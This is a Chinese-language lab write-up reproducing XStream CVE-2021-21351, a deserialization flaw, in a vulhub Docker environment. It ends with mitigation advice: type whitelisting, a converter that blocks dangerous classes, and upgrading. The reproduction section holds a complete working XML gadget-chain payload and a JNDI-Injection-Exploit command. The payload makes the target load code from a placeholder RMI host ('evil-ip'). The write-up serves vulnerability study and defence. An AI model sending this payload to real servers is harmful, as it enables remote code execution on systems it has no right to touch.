## 0x00 简介

XStream是Java类库，用来将对象序列化成XML
（JSON）或反序列化为对象。XStream是自由软件，可以在BSD许可证的许可下分发。它是一种OXMapping
技术，是用来处理XML文件序列化的框架在将javaBean序列化，或将XML文件反序列化的时候，不需要其它辅助类和映射文件，使得XML序列化不再繁琐。

## 0x01 漏洞概述

在 1.4.16 版本之前的 XStream
中，存在一个漏洞，允许远程攻击者仅通过操纵处理后的输入流，解组时处理的流包含类型信息以重新创建以前编写的对象，XStream
因此基于这些类型信息创建新实例，攻击者可以操纵处理过的输入流并替换或注入对象，从而执行从远程服务器加载的任意代码。没有用户受到影响，他们遵循建议设置
XStream 的安全框架，并将白名单限制为所需的最少类型。如果您依赖 XStream 的默认安全框架黑名单，则必须至少使用 1.4.16 版本。

## 0x02 影响范围

> Xstream<=1.4.15

## 0x03 环境搭建

1.使用docker进行验证

> https://github.com/vulhub/vulhub/tree/master/xstream/CVE-2021-21351

2.启动及运行该环境

> docker-compose up -d

![image-20210809131729953](https://image.3001.net/images/20210813/1628846207_6116387f5a2366fb72dac.png!small)

2.查看环境启动情况

![image-20210809131753838](https://image.3001.net/images/20210813/1628846208_61163880c5a327d80c765.png!small)

启动成功后访问

> http://192.168.141.131:8080

![image-20210809131814979](https://image.3001.net/images/20210813/1628846209_61163881c0a5673651548.png!small)

3.Bp抓包，测试服务器是否启动

![image-20210809131834892](https://image.3001.net/images/20210813/1628846210_61163882c1c8dec65e959.png!small)

把GET请求改为POST，并添加如下命令

> <?xml version="1.0" encoding="UTF-8" ?>  
> ​  
> <user>  
> ​  
> <name>MAX</name>  
> ​  
> <age>99</age>  
> ​  
> </user>

![image-20210809131901607](https://image.3001.net/images/20210813/1628846211_61163883efaad88b5b0d0.png!small)

如上，服务器正常

## 0x04 漏洞复现

该漏洞需org.apache.naming.factory.BeanFactory`借助EL表达式注入来执行任意命令，使用JNDI-Injection-Exploit工具可以启动JNDI服务器以获得 JNDI 链接，可以将这些链接插入到你的POC中来测试漏洞

工具链接

> https://github.com/welk1n/JNDI-Injection-Exploit/

1.下载该工具jar文件

> https://github.com/welk1n/JNDI-Injection-> Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar

2.使用如下命令

> java -jarJNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C"touch
> /tmp/success"-A192.168.141.131

![image-20210809131918568](https://image.3001.net/images/20210813/1628846213_61163885b44d086a0a97e.png!small)

3.使用箭头所指的基于SpringBoot漏洞利用工具的RMI地址

> rmi://192.168.141.131:1099/7kqx32

作为POC中的

> <dataSource>rmi://evil-ip:1099/example</dataSource>

POC如下

> <sorted-set>  
> ​  
> <javax.naming.ldap.Rdn_-RdnEntry>  
> ​  
> <type>ysomap</type>  
> ​  
> <valueclass='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>  
> ​  
> <m__DTMXRTreeFrag>  
> ​  
> <m__dtmclass='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>  
> ​  
> <m__size>-10086</m__size>  
> ​  
> <m__mgrDefault>  
> ​  
> <__overrideDefaultParser>false</__overrideDefaultParser>  
> ​  
> <m__incremental>false</m__incremental>  
> ​  
> <m__source__location>false</m__source__location>  
> ​  
> <m__dtms>  
> ​  
> <null/>  
> ​  
> </m__dtms>  
> ​  
> <m__defaultHandler/>  
> ​  
> </m__mgrDefault>  
> ​  
> <m__shouldStripWS>false</m__shouldStripWS>  
> ​  
> <m__indexing>false</m__indexing>  
> ​  
>
> <m__incrementalSAXSourceclass='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>  
> ​  
>
> <fPullParserConfigclass='com.sun.rowset.JdbcRowSetImpl'serialization='custom'>  
> ​  
> <javax.sql.rowset.BaseRowSet>  
> ​  
> <default>  
> ​  
> <concurrency>1008</concurrency>  
> ​  
> <escapeProcessing>true</escapeProcessing>  
> ​  
> <fetchDir>1000</fetchDir>  
> ​  
> <fetchSize>0</fetchSize>  
> ​  
> <isolation>2</isolation>  
> ​  
> <maxFieldSize>0</maxFieldSize>  
> ​  
> <maxRows>0</maxRows>  
> ​  
> <queryTimeout>0</queryTimeout>  
> ​  
> <readOnly>true</readOnly>  
> ​  
> <rowSetType>1004</rowSetType>  
> ​  
> <showDeleted>false</showDeleted>  
> ​  
> <dataSource>rmi://evil-ip:1099/example</dataSource>  
> ​  
> <listeners/>  
> ​  
> <params/>  
> ​  
> </default>  
> ​  
> </javax.sql.rowset.BaseRowSet>  
> ​  
> <com.sun.rowset.JdbcRowSetImpl>  
> ​  
> <default/>  
> ​  
> </com.sun.rowset.JdbcRowSetImpl>  
> ​  
> </fPullParserConfig>  
> ​  
> <fConfigSetInput>  
> ​  
> <class>com.sun.rowset.JdbcRowSetImpl</class>  
> ​  
> <name>setAutoCommit</name>  
> ​  
> <parameter-types>  
> ​  
> <class>boolean</class>  
> ​  
> </parameter-types>  
> ​  
> </fConfigSetInput>  
> ​  
> <fConfigParsereference='../fConfigSetInput'/>  
> ​  
> <fParseInProgress>false</fParseInProgress>  
> ​  
> </m__incrementalSAXSource>  
> ​  
> <m__walker>  
> ​  
> <nextIsRaw>false</nextIsRaw>  
> ​  
> </m__walker>  
> ​  
> <m__endDocumentOccured>false</m__endDocumentOccured>  
> ​  
> <m__idAttributes/>  
> ​  
> <m__textPendingStart>-1</m__textPendingStart>  
> ​  
> <m__useSourceLocationProperty>false</m__useSourceLocationProperty>  
> ​  
> <m__pastFirstElement>false</m__pastFirstElement>  
> ​  
> </m__dtm>  
> ​  
> <m__dtmIdentity>1</m__dtmIdentity>  
> ​  
> </m__DTMXRTreeFrag>  
> ​  
> <m__dtmRoot>1</m__dtmRoot>  
> ​  
> <m__allowRelease>false</m__allowRelease>  
> ​  
> </value>  
> ​  
> </javax.naming.ldap.Rdn_-RdnEntry>  
> ​  
> <javax.naming.ldap.Rdn_-RdnEntry>  
> ​  
> <type>ysomap</type>  
> ​  
> <valueclass='com.sun.org.apache.xpath.internal.objects.XString'>  
> ​  
> <m__objclass='string'>test</m__obj>  
> ​  
> </value>  
> ​  
> </javax.naming.ldap.Rdn_-RdnEntry>  
> ​  
> </sorted-set>

复制到bp中进行修改并发送

其中 "evil-ip" 处要修改为攻击机的ip，如下图所示

![image-20210809131940300](https://image.3001.net/images/20210813/1628846216_6116388806eae95c4cb13.png!small)

右边出现报错，说明跳转页面url无对应值，不影响复现结果

4.进入容器，执行

> docker-compose exec web bash

"ls /tmp/" 查看可知 "touch /tmp/success" 已被执行，成功创建了 "success" 文件

![image-20210809132000075](https://image.3001.net/images/20210813/1628846217_6116388981d79f0f1574d.png!small)

## 0x05 防护建议

1.配置XStream的安全框架为允许的类型使用白名单

> XStream xstream= new XStream();  
> ​  
> XStream.setupDefaultSecurity(xstream);  
> ​  
> // 添加您允许的类型，在此处输入层次结构或包

2.注册自己的转换器，以防止解组当前已知的 Java 运行时关键类型

> xstream.registerConverter(newConverter() {  
> ​  
> publicbooleancanConvert(Classtype) {  
> ​  
> returntype!=null  
>
> &&(type==java.beans.EventHandler.class||type==java.lang.ProcessBuilder.class||type==java.lang.Void.class||void.class  
> ​  
> ||type.getName().equals("javax.imageio.ImageIO$ContainsFilter")
> ||type.getName().equals("sun.awt.datatransfer.DataTransferer$IndexOrderComparator")
> ||type.getName().equals("com.sun.corba.se.impl.activation.ServerTableEntry")
> ||type.getName().equals("com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator")  
> ​  
> ||type.getName().matches("javafx\\\\.collections\\\\.ObservableList\\\$.*")
> ||type.getName().matches(".*\\\$ServiceNameIterator")
> ||type.getName().matches(".*\\\$GetterSetterReflection")
> ||type.getName().matches(".*\\\$LazyIterator")
> ||type.getName().matches(".*\\\\.bcel\\\\..*\\\\.util\\\\.ClassLoader")  
> ​  
> ||java.io.InputStream.class.isAssignableFrom(type)
> ||java.nio.channels.Channel.isAssignableFrom(type)
> ||javax.activation.DataSource.isAssignableFrom(type)
> ||javax.sql.rowset.BaseRowSet.isAssignableFrom(type)  
> ||Proxy.isProxy(type));  
> ​  
> }  
> ​  
> publicObjectunmarshal(HierarchicalStreamReaderreader,
> UnmarshallingContextcontext) {  
> thrownewConversionException("Unsupported type due to security reasons.");  
> }  
> ​  
> ​  
> publicvoidmarshal(Objectsource, HierarchicalStreamWriterwriter,
> MarshallingContextcontext) {  
> thrownewConversionException("Unsupported type due to security reasons.");  
> }  
> ​  
> }, XStream.PRIORITY_VERY_HIGH);

3.升级Xstream到最新版本

